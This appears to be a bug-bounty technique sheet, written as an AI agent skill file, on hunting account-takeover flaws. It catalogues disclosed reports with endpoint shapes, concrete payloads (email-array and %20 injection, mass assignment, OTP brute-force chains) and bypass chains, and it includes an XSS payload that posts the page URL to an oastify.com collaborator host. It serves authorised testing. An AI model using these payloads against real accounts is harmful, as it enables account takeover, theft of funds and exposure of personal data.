---
name: hunter-l3-account-takeover
description: "Use when hunting Account Takeover on a target. Loads the L3 technique sheet: Account takeover (ATO) is the class of bugs where an attacker gains control of a victim's account without knowing their password — through broken email/identity binding, unverified trust in client-sup"
domain: cybersecurity
subdomain: web
tags:
- web
- account-takeover
- hunting
- l3
version: '1.0'
---

# Account Takeover — Technique Sheet

## Overview
Account takeover (ATO) is the class of bugs where an attacker gains control of a victim's account without knowing their password — through broken email/identity binding, unverified trust in client-supplied identifiers, token reuse, OTP weaknesses, or OAuth flows that skip verification. It pays consistently well (records show $8,000 Uber, $35,000 GitLab bounties, and confirmed program-validated takeovers at Reddit, IBM, TikTok, Yelp, Stripe). The dominant root-cause families across these 60 records: (1) emails added/changed without verification or re-authentication, then pivoted to "forgot password"; (2) password-reset endpoints that fail to validate token-to-identity binding; (3) OAuth/login flows that trust client-controlled identity claims (email, fbid, Host header, response body); (4) rate-limited OTP brute-force; and (5) token leakage via redirects, fragments, and injected JS.

## Distinct sub-patterns

### 1. Password-reset / invite-link email parameter injection (array parameter confusion)
- **Endpoint shape:** `POST /users/password` (Rails-style reset), `POST /resetpassword`, forgot-password endpoints generally.
- **Payload that fired:** `{"email":["victim@gmail.com","your@gmail.com"]}` (UPchieve, id=1175081); GitLab variant with JSON content-type: `"user" { "email" [ "victim@gmail.com", "attacker@gmail.com" ] }` (id=2293343).
- **Root cause:** The endpoint accepts an array where a string is expected, and the reset-link generator sends the same token to every address in the array.
- **Impact:** Attacker receives the identical reset link as the victim and resets the password with zero victim interaction. GitLab bounty: $35,000.
- **Exemplars:** 1175081, 2293343.

### 2. Reset-token identity binding failure
- **Endpoint shapes:** `POST /admin/shops/{num}/accounts/{num}/send_invite` + `POST invite_links` (Shopify, id=1266828); password-reset/email-change flow with account ID in URL (Stripe, id=1685970); Remitly `POST /orchestrator/v1/password_reset/start` (id=2831902); DoD `POST /{password-change}` trusting `UID2` cookie + `userName` param (id=1004750).
- **Payload:** Shopify sent `authenticity_token=qHWmHVuCLbQOWT2cCElOvv%2BAQoHz4AvsMdVzW8zkjiTemE5jx2q7IdeX9nfSnVHA45fbdXVx4oo%2FYhU%2FpnnW8Q%3D%3D` to send_invite on an already-activated account (UI blocks it; backend doesn't).
- **Root cause:** Server validates the token format but not that the token belongs to the account being modified, or issues fresh credentials for accounts the flow should exclude.
- **Impact:** Mass ATO (Stripe — arbitrary users' emails changed via the reset flow); Shopify: fresh invite link for an activated wholesale account → password reset → takeover; Remitly: reset endpoint leaked victim `AMP_<session>`/JWT tokens in its own response, letting the attacker substitute their own OTP and complete the victim's reset → steal funds.
- **Exemplars:** 1685970, 1266828, 2831902, 1004750.

### 3. Email added/changed without verification, password check, or notification
- **Endpoint shapes:** `POST /settings/emails` (Vimeo, id=45084); `POST /account/info/bio/v1` (Yelp, id=3766455); Coursera change-email (id=292673); Khan Academy `GET/POST /settings` "connect email" (id=721341); Gratipay `POST /participant/email` with `action=add-email&address=victim@gmail.com%20` (id=273647); Phabricator `POST /settings/user/{username}/page/email/` reusing the attacker's own CSRF token against the victim account (id=1271710); HackerOne SCIM provisioning (id=3178999).
- **Payloads:** Gratipay: trailing `%20` defeats the email-uniqueness check so an already-registered victim email can be attached to the attacker's account; Yelp bio endpoint: `{"first_name":"<current>","last_name":"<current>","email":"attacker@example.com","role":"OWNER"}` — mass-assignment rewrites a field the UI renders as locked.
- **Root cause:** Email is treated as a self-asserted attribute: no ownership proof, no password re-authentication, uniqueness checks that miss whitespace/case, session-token reuse across accounts, or SCIM/SSO admin paths that silently rewrite emails.
- **Impact:** In every case the pivot is the same: attacker-controlled email on the victim's account → password reset → full takeover. Yelp confirmed real "Reset Password - Yelp" delivery and password set without the old one; Phabricator added the attacker's email to the victim's account by swapping the email parameter in a captured request.
- **Exemplars:** 45084, 3766455, 292673, 721341, 273647, 1271710, 3178999, 2587953.

### 4. OAuth/email-verification linking without proof of email ownership (pre-ATO / signup collision)
- **Endpoint shapes:** OAuth signup/login flows (Badoo id=1074047, Reddit id=1212374); email-registration flows (MapLogin `POST /register` id=64626, Reddit `/account/register` id=1815463); Google OneTap trust (Priceline id=671406); Cognito `update-user-attributes` (Flickr, id=1342088).
- **Root cause:** The provider trusts the email returned by OAuth without confirming the account holder owns it (including unverified GSuite-domain emails at Priceline). At Flickr, the Cognito API let a user link any unverified email to their own account, login did not check `email_verified`, and case-normalization enabled logging in as the victim.
- **Impact:** Full ATO knowing only the victim's email, with no victim interaction (Flickr, Reddit, Priceline). Bumble/Badoo is classic pre-ATO: attacker registers with the victim's unverified email + password; victim later signs up via Google/MSN/VK OAuth; attacker logs in with their password.
- **Exemplars:** 1074047, 1212374, 64626, 671406, 1342088, 1815463.

### 5. Verification/token lifecycle bugs (stale, weak, leaked, reusable tokens)
- **Endpoint shapes:** `GET /confirm_email?token=...` (Sorare, id=1817214); Mattermost email-change verification (id=1114347); Bumble email-confirmation endpoint (id=746186); Weblate `POST /accounts/reset/` long-lived reset cookie (id=1004536) and reset-link-logs-you-in (id=223637); Rocket.Chat reset-token NoSQL injection (id=1581059); Discourse invite redemption (id=242765); Sorare team-invite link tampering (id=1357013).
- **Payloads:** Sorare: `token=Jt7S7WS_6EphEyiDn6z_` — changed one digit in a leaked, expired confirmation token and it signed the attacker in. Discourse: `GET /invites/redeem/{token}?email=victimemail@gmail.com` — redeem any valid invite token with the victim's email. Mattermost signup link: strip the `email` field from `?d={...json...}` and the flow accepts an attacker-supplied email.
- **Root cause:** Tokens that never expire on state change, weak token entropy (predictable digit substitution), confirmation links dorkable via `site:sorare.com inurl:token`, redemption not bound to the issued email, and reset-token lookups vulnerable to blind regex/NoSQL injection in the email field (Rocket Chat extracted the admin's reset token char-by-char — CVE-2022-32211).
- **Impact:** Passwordless login, admin ATO via token extraction, any trust-level-2+ Discourse user taking over any account including admin, victim's private messages exposed (Mattermost).
- **Exemplars:** 1817214, 1114347, 242765, 1581059, 1357013, 1004536, 223637, 746186.

### 6. Identity claim trusted directly from client (fbid / cookie / session ID / response)
- **Endpoint shapes:** `POST /v2/auth.json` with `fbid` (Eternal/Zomato, id=202921); session cookie `PROD_CAS_SESSION: 195141` = raw 6-digit User ID (DoD, id=215859); `POST /signin` with only `{"email":"victim@example.com"}` (GSA, id=1483201); Mars login response manipulation (id=1959540); Zenly `POST /SessionCreate` sharing one session token for the same phone number (id=1245762); Grab `POST /api/passenger/v2/profiles/activationsms` + `activate` with payloads `1056, 1057, 1058` (id=205000); passwordless-signup `{"phoneNumberE164":"+xxxxxxxx",...,"newPasswordData":{"newPassword":"12345678911a!"}}` (Uber, id=143717).
- **Root cause:** The server treats client-supplied identifiers (Facebook ID, raw user ID in cookie, email alone, phone number) as authentication. Mars: attacker alters the server's login response to "success" and sets a cookie with the target's user ID. Zenly: /SessionCreate returns the same token for the same phone until verified, so attacker and victim share it — attacker waits for the victim to verify the SMS. Grab: resend endpoint is unthrottled (30s delay resets the 3-attempt counter), so the 4-digit OTP is brute-forceable.
- **Impact:** Any-account ATO from a single identifier: Zomato via enumerated friend fbids; GSA via email alone (PII exposure); Uber phone-number-only password change on Rider accounts; Grab OTP bypass on any account by phone number; Zenly victim's location/conversations/friends.
- **Exemplars:** 202921, 215859, 1483201, 1959540, 1245762, 205000, 143717, 202740 (VK flood control).

### 7. OAuth callback/redirect leakage of tokens
- **Endpoint shapes:** Periscope OAuth `callback_url = a/../../login?redirect_after_login=https://cards.twitter.com/card_id` (path traversal to open redirector, id=110293); `GET https://www.digits.com/bridge?consumer_key={key}&host={host}` (id=110467); `GET /i/twitter/login` with `Host: hackerone.com/www.periscope.tv` (id=317476); Hostinger `GET /login/?redirectUrl={url}` (id=3081691); Khan Academy `GET /login?continue={url}` (id=3723458); GitLab SAML `RelayState=.witcoat.com` (id=1923672); Reddit Apple OAuth fragment exfil (id=1567186); Weblate `POST /accounts/complete/ubuntu/` CSRF (id=225653).
- **Payloads:** Hostinger: `x"></a><script>fetch('...oastify.com',{method:'POST',body:window.location});</script>` reflected in the whitelisted redirect URL. Khan Academy: `https://xfarr-6fmjyrz2lq-uc-a-run.app/` — the domain regex leaves dots unescaped, so `6fmjyrz2lq-uc.a.run.app`-style hyphen domains pass validation and receive the one-time transfer auth token. Reddit Apple flow: `response_mode=fragment` drops code+id_token into the reddit.com URL fragment, where attacker JS on www.redditmedia.com reads it.
- **Root cause:** Redirect/callback destinations built from attacker-influenced inputs (Host header, RelayState, redirectUrl, continue, callback_url) with insufficient validation; bridge/proxy endpoints that check parameters but not the embedding page's origin; OAuth tokens in URL fragments reachable by injected JS.
- **Impact:** Stolen oauth_token/verifier, auth tokens minted into valid JWTs (Hostinger: full hPanel/VPS/email control), Bitbucket OAuth token with repo read/write via the GitLab chain (logout CSRF + persisted RelayState open redirect + Bitbucket implicit grant), full Khan Academy session via replayed transfer token.
- **Exemplars:** 110293, 317476, 3081691, 3723458, 1923672, 1567186, 110467, 225653.

### 8. XSS / CSRF pivot to account linkage
- **Endpoint shape:** `POST /google_connect/register` (Yelp, id=2010530) with `{"id_token": id_token, "csrftok": b[1]}` fired from persistent XSS.
- **Root cause:** The account-linking endpoint lacks origin/CSRF protection, so injected JS submits an attacker-generated Google id_token and links the attacker's Google account to the victim's Yelp account. Also captured credentials via an injected keylogger on the login page.
- **Impact:** Full ATO on biz.yelp.com; keylogger exfiltrated business-account email/passwords.
- **Exemplars:** 2010530.

### 9. Linked-identity and external-surface pivots
- **Shapes:** Rockstar Switch Account trusting a linked Steam/Epic identity without re-auth (id=1442783); Badoo FB photo-import link with a token valid for any user replacing the victim's linked FB account (id=121827); unauthenticated staging webmail exposing WordPress reset emails (Automattic maildev, id=1067547); Zendesk ticket hash as Google account name leaking verification to public tickets (GitLab, id=498964); clear-text victim credentials discoverable on VirusTotal (Khan Academy, id=3080597); password reuse across accounts (Legal Robot, id=277213); Android intent leaking the Basecamp OAuth2 token to a malicious local app (id=2516732); monero-wallet-rpc port hijack impersonating the server (id=462442); purchase-parameter manipulation setting a target's email at Chaturbate (id=394329); 2FA reset that auto-enables after one day with no confirmation (HackerOne, id=2492631); MTN selfservice portal takeover by phone number (id=2542372); HackerOne 2FA reset auto-disable (id=2492631); PC (id=3080597). Program-confirmed Android recovery auth bypass (TikTok, id=2443228) and registration response manipulation (IBM, id=1994227).
- **Root cause:** Trust extended to adjacent identities/systems (linked Steam/Epic, FB tokens, mail servers, support ticketing) without re-verifying the human; reset infrastructure (webmail, support inbox) treated as trusted when it is externally reachable.
- **Impact:** GitLab internal dashboards/redash/prometheus via the Google support-account verification; Automattic WordPress admin reset (RCE not executed); Rockstar Social Club takeover from a Steam/Epic compromise; Chaturbate password reset via attacker-set email.
- **Exemplars:** 1442783, 498964, 1067547, 121827, 2516732, 394329, 2492631.

## Bypass / chain notes
- **The add-email → forgot-password pivot** is the universal chain: find any way to bind an attacker email to the victim account (verification gap, %20 uniqueness bypass, mass-assignment, CSRF on linking endpoint, SCIM), then reset.
- **Type confusion on email params:** arrays (`["victim","attacker"]`) and trailing whitespace (`victim@gmail.com%20`) defeat string-based validation — always try array bodies and `%20` suffixes.
- **Content-type confusion:** converting a form-encoded reset request to JSON enabled the GitLab array injection ($35k).
- **Multi-step chains seen:** IDOR to get victim UID2 → password change (DoD 1004750); logout CSRF → persisted SAML RelayState open redirect → Bitbucket implicit-grant token theft (1923672); XSS → keylogger → Google account link → login as victim (2010530); reverse-engineered consumer_key → callback path traversal → Twitter open redirect → token leak (110293); resend-rate-limit reset → 3-attempt OTP brute-force loop (205000); own OTP + victim's leaked session tokens → victim reset completion (2831902).
- **Filter bypasses:** domain regexes with unescaped dots (Khan Academy), host-parameter-only validation with no origin check (Digits bridge), whitelisted subdomain reflecting HTML (Hostinger), bare-path callback_urls passing "starts with" checks (Periscope).
- **Dorking works:** `site:sorare.com inurl:token` surfaced leaked confirmation links; crt.sh/Zendesk tickets leaked Google verification emails.

## Gotchas / what NOT to do
- Don't test with a real stranger's account — every confirmed ATO in these records was demonstrated on the hunter's own second account or an explicitly sanctioned target.
- Don't stop at "the UI blocks it": Shopify's UI blocked send_invite on activated accounts while the backend accepted it (1266828); Yelp's UI rendered the email field locked while the API accepted it (3766455).
- Don't assume reset links die on use — Weblate tokens stayed valid for hours as cookies and confirmation links indexed by Google were reusable.
- Don't report rate-limit absence without a working ATO path — VK's insufficient flood control alone was program-acknowledged but details withheld; pair OTP throttling findings with the brute-force chain.
- Don't escalate to RCE where the report didn't (Automattic researcher explicitly did not execute plugin upload) — report the verified impact.
- Expired/one-time isn't expired: always replay "used" tokens once before assuming they're dead.

## Real-world impact examples
- **$35,000** — GitLab password-reset email-array injection: password changed with only the victim's email, no interaction (id=2293343).
- **$8,000** — Uber complete ATO (id=136885); separately, passwordless-signup endpoint set any user's password from their phone number (id=143717).
- **Mass ATO** — Stripe: arbitrary users' emails changed through the reset flow via token/account-ID binding failure (id=1685970).
- **Fund theft** — Remitly: zero-interaction password reset via leaked AMP_/JWT tokens in the reset-start response (id=2831902).
- **Internal infrastructure** — GitLab support@gitlab.com Google-account verification → access to redash/dashboards/prometheus.gitlab.com (id=498964).
- **Full site takeover** — Automattic maildev exposure → WordPress 'api' admin reset (id=1067547); Reddit Apple OAuth fragment exfil → single-click victim hijack (id=1567186).
- **PII exposure** — GSA sign-in with email only → victim phone numbers (id=1483201); MTN Nigeria: date of birth, NIN, full name + airtime theft (id=2542372).
- **Admin compromise** — Rocket.Chat low-priv user extracted admin reset token via blind NoSQL injection (CVE-2022-32211, id=1581059); Discourse any TL2+ user → admin takeover (id=242765).